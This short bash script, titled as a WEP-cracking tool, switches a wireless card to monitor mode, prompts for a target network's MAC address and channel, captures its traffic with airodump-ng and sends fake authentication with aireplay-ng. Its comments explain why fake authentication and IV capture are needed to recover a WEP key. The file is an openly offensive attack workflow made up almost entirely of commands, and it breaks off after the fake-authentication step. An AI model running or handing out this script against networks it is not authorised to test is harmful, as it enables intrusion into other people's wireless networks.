#!/bin/bash

##############################
#  WEP CRACKING--NO PACKETS  #
##############################


# Requires airodump-ng and aircrack-ng packages
# This script attempts to crack WEP encryption on networks with little or no traffica
# The access point wil ignore requests from devices not associated with it
# Therefore must first use fake authentication 
# WEP uses RC4 where packet is encrypted at the AP and decrypted at the client
# Must capture packets with the initializing vector (IV) to get the key

ifconfig wlan1

echo "What is your MAC address?"
read my_mac

ifconfig wlan1 down
iwconfig wlan1 mode monitor

airodump-ng wlan1

echo "What network do you want to target?"
read host_mac

echo "What channel is the network on?"
read ch

airodump-ng --bssid $host_mac --channel $ch wlan1 

aireplay-ng --fakeauth 0 -a $host_mac -h $my_mac wlan1              			# fakeauth is number of packets to send

#ifconfig wlan0 down
#iwconfig wlan0 mode managed
#ifconfig wlan0 up
